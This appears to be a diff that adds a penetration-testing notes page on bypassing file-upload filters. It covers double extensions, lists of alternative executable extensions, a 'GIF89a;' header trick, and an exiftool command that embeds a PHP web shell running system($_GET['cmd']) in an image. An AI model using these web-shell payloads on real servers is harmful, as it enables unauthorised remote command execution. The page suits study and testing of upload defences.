@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Bypassing File Upload - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Bypass File Upload Filtering", url: "#_top", children: [
+              {title: "Rename it", url: "#rename-it" },
+              {title: "GIF89a;", url: "#gif89a" },
+              {title: "In image", url: "#in-image" },
+              {title: "Nullbyte", url: "#nullbyte" },
+              {title: "References", url: "#references" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../cross_site_request_forgery/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../cross_site_request_forgery/" class="btn btn-xs btn-link">
+        Cross-site Request Forgery
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../host-header-attack/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../host-header-attack/" class="btn btn-xs btn-link">
+        Host-header Attacks
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="bypass-file-upload-filtering">Bypass File Upload Filtering<a class="headerlink" href="#bypass-file-upload-filtering" title="Permanent link">#</a></h1>
+<p>One common way to gain a shell is actually not really a vulnerability, but a feature! Often times it is possible to upload files to the webserver. This can be abused byt just uploading a reverse shell. The ability to upload shells are often hindered by filters that try to filter out files that could potentially be malicious. So that is what we have to bypass.</p>
+<h2 id="rename-it">Rename it<a class="headerlink" href="#rename-it" title="Permanent link">#</a></h2>
+<p>We can rename our shell and upload it as shell.php.jpg. It passed the filter and the file is executed as php.</p>
+<p><strong>php</strong>
+phtml, .php, .php3, .php4, .php5, and .inc</p>
+<p><strong>asp</strong>
+asp, .aspx</p>
+<p><strong>perl</strong>
+.pl, .pm, .cgi, .lib</p>
+<p><strong>jsp</strong>
+.jsp, .jspx, .jsw, .jsv, and .jspf</p>
+<p><strong>Coldfusion</strong>
+.cfm, .cfml, .cfc, .dbm</p>
+<h2 id="gif89a">GIF89a;<a class="headerlink" href="#gif89a" title="Permanent link">#</a></h2>
+<p>If they check the content.
+Basically you just add the text "GIF89a;" before you shell-code. So it would look something like this:</p>
+<pre><code>GIF89a;
+&lt;?
+system($_GET['cmd']);//or you can insert your complete shell code
+?&gt;
+</code></pre>
+
+<h2 id="in-image">In image<a class="headerlink" href="#in-image" title="Permanent link">#</a></h2>
+<pre><code>exiftool -Comment='&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET['cmd']); ?&gt;' lo.jpg
+</code></pre>
+
+<p>Exiftool is a great tool to view and manipulate exif-data.
+Then I had to rename the file</p>
+<p>mv lo.jpg lo.php.jpg</p>
+<h2 id="nullbyte">Nullbyte<a class="headerlink" href="#nullbyte" title="Permanent link">#</a></h2>
+<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">#</a></h2>
+<p>http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html</p>
+<p>https://www.owasp.org/index.php/Unrestricted_File_Upload
+http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Webshells%20In%20PHP,%20ASP,%20JSP,%20Perl,%20And%20ColdFusion.pdf</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../cross_site_request_forgery/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../cross_site_request_forgery/" class="btn btn-xs btn-link">
+        Cross-site Request Forgery
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../host-header-attack/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../host-header-attack/" class="btn btn-xs btn-link">
+        Host-header Attacks
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_web_applications/bypass_image_upload.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
